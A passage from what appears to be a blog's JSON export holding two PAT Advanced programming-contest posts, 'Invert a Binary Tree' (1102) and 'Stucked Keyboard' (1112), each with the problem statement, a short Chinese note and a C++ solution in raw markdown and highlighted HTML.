class=\"keyword\">while</span> (!q.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> tmp;</div><div class=\"line\">\t\ttmp = q.front();</div><div class=\"line\">\t\tq.pop();</div><div class=\"line\">\t\ttmp == root ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, tmp) : <span class=\"built_in\">printf</span>(<span class=\"string\">\" %d\"</span>, tmp);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (node[tmp][<span class=\"number\">1</span>] != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\tq.push(node[tmp][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (node[tmp][<span class=\"number\">0</span>] != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\tq.push(node[tmp][<span class=\"number\">0</span>]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inorder</span><span class=\"params\">(<span class=\"keyword\">int</span> root)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (node[root][<span class=\"number\">1</span>] != <span class=\"number\">-1</span>) inorder(node[root][<span class=\"number\">1</span>]);</div><div class=\"line\">\t++z != n ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, root): <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, root);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (node[root][<span class=\"number\">0</span>] != <span class=\"number\">-1</span>) inorder(node[root][<span class=\"number\">0</span>]);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tgetchar();</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t((x = getchar()) != <span class=\"number\">45</span>) ? (node[i][<span class=\"number\">0</span>] = x - <span class=\"string\">'0'</span>) : (node[i][<span class=\"number\">0</span>] = <span class=\"number\">-1</span>);</div><div class=\"line\">\t\tgetchar();</div><div class=\"line\">\t\t((x = getchar()) != <span class=\"number\">45</span> )? (node[i][<span class=\"number\">1</span>] = x - <span class=\"string\">'0'</span>) : (node[i][<span class=\"number\">1</span>] = <span class=\"number\">-1</span>);</div><div class=\"line\">\t\tgetchar();</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\ty = node[i][<span class=\"number\">0</span>];</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (y != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\troot[y] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\ty = node[i][<span class=\"number\">1</span>];</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (y != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\troot[y] = <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (root[i] != <span class=\"number\">1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tflag = i;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\tdfs(flag);</div><div class=\"line\">\tinorder(flag);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1102.Invert a Binary Tree</p>\n<p>Google: 90% of our engineers use the software you wrote (Homebrew), but you can’t invert a binary tree on a whiteboard so fuck off.</p>\n<p>Now it’s your turn to prove that YOU CAN invert a binary tree!</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line gives a positive integer N (&lt;=10) which is the total number of nodes in the tree – and hence the nodes are numbered from 0 to N-1. Then N lines follow, each corresponds to a node from 0 to N-1, and gives the indices of the left and right children of the node. If the child does not exist, a “-“ will be put at the position. Any pair of children are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in the first line the level-order, and then in the second line the in-order traversal sequences of the inverted tree. There must be exactly one space between any adjacent numbers, and no extra space at the end of the line.</p>\n<p>Sample Input:<br>8<br>1 -<br>- -<br>0 -<br>2 7<br>- -<br>- -<br>5 -<br>4 6</p>\n<p>Sample Output:<br>3 7 2 6 4 0 5 1<br>6 5 7 4 3 2 0 1</p>\n</blockquote>\n<p>dfs+inorder，考前练手。。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> node[maxN][<span class=\"number\">2</span>];</div><div class=\"line\"><span class=\"keyword\">char</span> x;</div><div class=\"line\"><span class=\"keyword\">int</span> y;</div><div class=\"line\"><span class=\"keyword\">int</span> z;</div><div class=\"line\"><span class=\"keyword\">int</span> root[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> flag;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"keyword\">int</span> root)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt; q;</div><div class=\"line\">\tq.push(root);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!q.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> tmp;</div><div class=\"line\">\t\ttmp = q.front();</div><div class=\"line\">\t\tq.pop();</div><div class=\"line\">\t\ttmp == root ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, tmp) : <span class=\"built_in\">printf</span>(<span class=\"string\">\" %d\"</span>, tmp);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (node[tmp][<span class=\"number\">1</span>] != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\tq.push(node[tmp][<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (node[tmp][<span class=\"number\">0</span>] != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\tq.push(node[tmp][<span class=\"number\">0</span>]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inorder</span><span class=\"params\">(<span class=\"keyword\">int</span> root)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (node[root][<span class=\"number\">1</span>] != <span class=\"number\">-1</span>) inorder(node[root][<span class=\"number\">1</span>]);</div><div class=\"line\">\t++z != n ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, root): <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, root);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (node[root][<span class=\"number\">0</span>] != <span class=\"number\">-1</span>) inorder(node[root][<span class=\"number\">0</span>]);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tgetchar();</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t((x = getchar()) != <span class=\"number\">45</span>) ? (node[i][<span class=\"number\">0</span>] = x - <span class=\"string\">'0'</span>) : (node[i][<span class=\"number\">0</span>] = <span class=\"number\">-1</span>);</div><div class=\"line\">\t\tgetchar();</div><div class=\"line\">\t\t((x = getchar()) != <span class=\"number\">45</span> )? (node[i][<span class=\"number\">1</span>] = x - <span class=\"string\">'0'</span>) : (node[i][<span class=\"number\">1</span>] = <span class=\"number\">-1</span>);</div><div class=\"line\">\t\tgetchar();</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\ty = node[i][<span class=\"number\">0</span>];</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (y != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\troot[y] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\ty = node[i][<span class=\"number\">1</span>];</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (y != <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\troot[y] = <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (root[i] != <span class=\"number\">1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tflag = i;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\tdfs(flag);</div><div class=\"line\">\tinorder(flag);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1112","date":"2017-02-19T07:49:26.000Z","_content":"\n## Descritpion\n\n> 1112.Stucked Keyboard\n\n> On a broken keyboard, some of the keys are always stucked. So when you type some sentences, the characters corresponding to those keys will appear repeatedly on screen for k times.\n\n> Now given a resulting string on screen, you are supposed to list all the possible stucked keys, and the original string.\n\n> Notice that there might be some characters that are typed repeatedly. The stucked key will always repeat output for a fixed k times whenever it is pressed. For example, when k=3, from the string \"thiiis iiisss a teeeeeest\" we know that the keys \"i\" and \"e\" might be stucked, but \"s\" is not even though it appears repeatedly sometimes. The original string could be \"this isss a teest\".\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the 1st line gives a positive integer k ( 1<k<=100 ) which is the output repeating times of a stucked key. The 2nd line contains the resulting string on screen, which consists of no more than 1000 characters from {a-z}, {0-9} and \"\\_\". It is guaranteed that the string is non-empty.\n\n> Output Specification:\n\n> For each test case, print in one line the possible stucked keys, in the order of being detected. Make sure that each key is printed once only. Then in the next line print the original string. It is guaranteed that there is at least one stucked key.\n\n> Sample Input:\n3\ncaseee1\\_\\_thiiis_iiisss\\_a\\_teeeeeest\n\n> Sample Output:\nei\ncase1\\_\\_this\\_isss\\_a\\_teest\n\n注意：必须全部输入才能判断坏键，如`sss_s`已判断为坏键为错误。一旦确定为好键则不会修改为坏键。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<map>\n#include<string>\n\nusing namespace std;\ntypedef long long LL;\n\nint k;\nint cou = 0;\nint sta = 0;\nchar pre;\nstring mes;\nstring ans = \"\";\nstring wrong = \"\";\nmap<char, int> m;\n\nint main()\n{\n\tscanf(\"%d\", &k);\n\tcin >> mes;\n\tmes += '#';\n\tm.insert(pair<char, int>('_', -1));\n\tfor (char i = 'a'; i <= 'z'; i++)\n\t\tm.insert(pair<char, int>(i, -1));\n\tfor (char i = '0'; i <= '9'; i++)\n\t\tm.insert(pair<char, int>(i, -1));\n\tpre = mes[0];\n\tfor (int i = 0; i < mes.length(); i++)\n\t{\n\t\tif (pre == mes[i])\n\t\t{\n\t\t\tsta = 0;\n\t\t\tcou++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsta = 1;\n\t\t\tif (cou % k == 0 && m[pre] == -1)\n\t\t\t{\n\t\t\t\tm[pre] = 0;\n\t\t\t\twrong += pre;\n\t\t\t}\n\t\t\tif (cou % k != 0)\n\t\t\t{\n\t\t\t\tm[pre] = 1;\n\t\t\t}\n\t\t\tpre = mes[i];\n\t\t\tcou = 1;\n\t\t\tcontinue;\n\t\t}\n\t}\n\tfor (int i = 0; i < wrong.size(); i++)\n\t\tif (m[wrong[i]] == 0)\n\t\t\tcout << wrong[i];\n\tcout << endl;\n\tfor (int i = 0; i < mes.size() - 1;)\n\t\tif (m[mes[i]])\n\t\t{ cout << mes[i]; i++; }\n\t\telse\n\t\t{ cout << mes[i]; i += k; }\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1112.md","raw":"---\ntitle: PAT advanced 1112\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-19 15:49:26\n---\n\n## Descritpion\n\n> 1112.Stucked Keyboard\n\n> On a broken keyboard, some of the keys are always stucked. So when you type some sentences, the characters corresponding to those keys will appear repeatedly on screen for k times.\n\n> Now given a resulting string on screen, you are supposed to list all the possible stucked keys, and the original string.\n\n> Notice that there might be some characters that are typed repeatedly. The stucked key will always repeat output for a fixed k times whenever it is pressed. For example, when k=3, from the string \"thiiis iiisss a teeeeeest\" we know that the keys \"i\" and \"e\" might be stucked, but \"s\" is not even though it appears repeatedly sometimes. The original string could be \"this isss a teest\".\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the 1st line gives a positive integer k ( 1<k<=100 ) which is the output repeating times of a stucked key. The 2nd line contains the resulting string on screen, which consists of no more than 1000 characters from {a-z}, {0-9} and \"\\_\". It is guaranteed that the string is non-empty.\n\n> Output Specification:\n\n> For each test case, print in one line the possible stucked keys, in the order of being detected. Make sure that each key is printed once only. Then in the next line print the original string. It is guaranteed that there is at least one stucked key.\n\n> Sample Input:\n3\ncaseee1\\_\\_thiiis_iiisss\\_a\\_teeeeeest\n\n> Sample Output:\nei\ncase1\\_\\_this\\_isss\\_a\\_teest\n\n注意：必须全部输入才能判断坏键，如`sss_s`已判断为坏键为错误。一旦确定为好键则不会修改为坏键。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<map>\n#include<string>\n\nusing namespace std;\ntypedef long long LL;\n\nint k;\nint cou = 0;\nint sta = 0;\nchar pre;\nstring mes;\nstring ans = \"\";\nstring wrong = \"\";\nmap<char, int> m;\n\nint main()\n{\n\tscanf(\"%d\", &k);\n\tcin >> mes;\n\tmes += '#';\n\tm.insert(pair<char, int>('_', -1));\n\tfor (char i = 'a'; i <= 'z'; i++)\n\t\tm.insert(pair<char, int>(i, -1));\n\tfor (char i = '0'; i <= '9'; i++)\n\t\tm.insert(pair<char, int>(i, -1));\n\tpre = mes[0];\n\tfor (int i = 0; i < mes.length(); i++)\n\t{\n\t\tif (pre == mes[i])\n\t\t{\n\t\t\tsta = 0;\n\t\t\tcou++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsta = 1;\n\t\t\tif (cou % k == 0 && m[pre] == -1)\n\t\t\t{\n\t\t\t\tm[pre] = 0;\n\t\t\t\twrong += pre;\n\t\t\t}\n\t\t\tif (cou % k != 0)\n\t\t\t{\n\t\t\t\tm[pre] = 1;\n\t\t\t}\n\t\t\tpre = mes[i];\n\t\t\tcou = 1;\n\t\t\tcontinue;\n\t\t}\n\t}\n\tfor (int i = 0; i < wrong.size(); i++)\n\t\tif (m[wrong[i]] == 0)\n\t\t\tcout << wrong[i];\n\tcout << endl;\n\tfor (int i = 0; i < mes.size() - 1;)\n\t\tif (m[mes[i]])\n\t\t{ cout << mes[i]; i++; }\n\t\telse\n\t\t{ cout << mes[i]; i += k; }\n\treturn 0;\n}\n```","slug":"PAT-advanced-1112","published":1,"updated":"2017-02-19T07:55:12.604Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k13002xhv18r8l9edyw","content":"<h2 id=\"Descritpion\"><a href=\"#Descritpion\" class=\"headerlink\" title=\"Descritpion\"></a>Descritpion</h2><blockquote>\n<p>1112.Stucked Keyboard</p>\n<p>On a broken keyboard, some of the keys are always stucked. So when you type some sentences, the characters corresponding to those keys will appear repeatedly on screen for k times.</p>\n<p>Now given a resulting string on screen, you are supposed to list all the possible stucked keys, and the original string.</p>\n<p>Notice that there might be some characters that are typed repeatedly. The stucked key will always repeat output for a fixed k times whenever it is pressed. For example, when k=3, from the string “thiiis iiisss a teeeeeest” we know that the keys “i” and “e” might be stucked, but “s” is not even though it appears repeatedly sometimes. The original string could be “this isss a teest”.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the 1st line gives a positive integer k ( 1&lt;k&lt;=100 ) which is the output repeating times of a stucked key. The 2nd line contains the resulting string on screen, which consists of no more than 1000 characters from {a-z}, {0-9} and “_“. It is guaranteed that the string is non-empty.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in one line the possible stucked keys, in the order of being detected. Make sure that each key is printed once only. Then in the next line print the original string. It is guaranteed that there is at least one stucked key.</p>\n<p>Sample Input:<br>3<br>caseee1__thiiis_iiisss_a_teeeeeest</p>\n<p>Sample Output:<br>ei<br>case1__this_isss_a_teest</p>\n</blockquote>\n<p>注意：必须全部输入才能判断坏键，如<code>sss_s</code>已判断为坏键为错误。一旦确定为好键则不会修改为坏键。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> k;</div><div class=\"line\"><span class=\"keyword\">int</span> cou = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> sta = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">char</span> pre;</div><div class=\"line\"><span class=\"built_in\">string</span> mes;</div><div class=\"line\"><span class=\"built_in\">string</span> ans = <span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"built_in\">string</span> wrong = <span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"built_in\">map</span>&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt; m;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;k);</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; mes;</div><div class=\"line\">\tmes += <span class=\"string\">'#'</span>;</div><div class=\"line\">\tm.insert(pair&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt;(<span class=\"string\">'_'</span>, <span class=\"number\">-1</span>));</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">char</span> i = <span class=\"string\">'a'</span>; i &lt;= <span class=\"string\">'z'</span>; i++)</div><div class=\"line\">\t\tm.insert(pair&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt;(i, <span class=\"number\">-1</span>));</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">char</span> i = <span class=\"string\">'0'</span>; i &lt;= <span class=\"string\">'9'</span>; i++)</div><div class=\"line\">\t\tm.insert(pair&lt;<span class=\"keyword\">char</span>, <span class=\"keyword\">int</span>&gt;(i, <span class=\"number\">-1</span>));</div><div class=\"line\">\tpre = mes[<span class=\"number\">0</span>];</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; mes.length(); i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (pre == mes[i])</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tsta = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\tcou++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tsta = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (cou % k == <span class=\"number\">0</span> &amp;&amp; m[pre] == <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tm[pre] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\t\twrong += pre;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (cou % k != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tm[pre] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tpre = mes[i];</div><div class=\"line\">\t\t\tcou = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; wrong.size(); i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (m[wrong[i]] == <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; wrong[i];</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; mes.size() - <span class=\"number\">1</span>;)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (m[mes[i]])</div><div class=\"line\">\t\t&#123; <span class=\"built_in\">cout</span> &lt;&lt; mes[i]; i++; &#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123; <span class=\"built_in\">cout</span> &lt;&lt; mes[i]; i += k; &#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Descritpion\"><a href=\"#Descritpion\" class=\"headerlink\" title=\"Descritpion\"></a>Descritpion</h2><blockquote>\n<p>1112.Stucked Keyboard</p>\n<p>On a broken keyboard, some of the keys are always stucked. So when you type some sentences, the characters corresponding to those keys will appear repeatedly on screen for k times.</p>\n<p>Now given a resulting string on screen, you are supposed to list all the possible stucked keys, and the original string.</p>\n<p>Notice that there might be some characters that are typed repeatedly. The stucked key will always repeat output for a fixed k times whenever it is pressed. For example, when k=3, from the string “thiiis iiisss a teeeeeest” we know that the keys “i” and “e” might be stucked, but “s” is not even though it appears repeatedly sometimes. The original string could be “this isss a teest”.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the 1st line gives a positive integer k ( 1&lt;k&lt;=100 ) which is the output repeating times of a stucked key. The 2nd line contains the resulting string on screen, which consists of no more than 1000 characters from {a-z}, {0-9} and “_“. It is guaranteed that the string is non-empty.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in one line the possible stucked keys, in the order of being detected. Make sure that each key is printed once only. Then in the next line print the original string. It is guaranteed that there is at least one stucked key.</p>\n<p>Sample Input:<br>3<br>caseee1__thiiis_iiisss_a_teeeeeest</p>\n<p>Sample Output:<br>ei<br>case1__this_isss_a_teest</p>\n</blockquote>\n<p>注意：必须全部输入才能判断坏键，如<code>sss_s</code>已判断为坏键为错误。一旦确定为好键则不会修改为坏键。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div 